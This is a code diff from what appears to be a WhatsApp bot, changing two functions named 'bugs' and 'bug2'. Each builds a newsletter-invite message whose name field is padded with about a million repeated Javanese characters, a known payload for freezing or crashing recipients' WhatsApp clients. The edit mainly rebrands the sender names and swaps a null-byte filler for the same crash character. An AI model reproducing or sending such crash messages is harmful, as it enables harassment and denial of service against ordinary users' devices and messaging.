@@ -18,11 +18,11 @@ export async function bugs(message, client, participant) {
 
                     "newsletterJid": `120363298524333143@newsletter`,
 
-                    "newsletterName": "Dev Senku" + "ꦾ".repeat(1020000),
+                    "newsletterName": "Mickey-Zenith" + "ꦾ".repeat(1020000),
 
                     "jpegThumbnail": ``,
 
-                    "caption": `Dev Senku admin channel`,
+                    "caption": `Mickey admin channel`,
 
                     "inviteExpiration": Date.now() + 1814400000
                 }
@@ -59,11 +59,11 @@ export async function bug2(message, client, participant) {
 
                     "newsletterJid": `120363298524333143@newsletter`,
 
-                    "newsletterName": "Dev Senku" + "\u0000".repeat(1020000),
+                    "newsletterName": "Mickey-Zenith" + "ꦾ".repeat(1020000),
 
                     "jpegThumbnail": ``,
 
-                    "caption": `Dev Senku admin channel`,
+                    "caption": `Mickey admin channel`,
 
                     "inviteExpiration": Date.now() + 1814400000
                 }
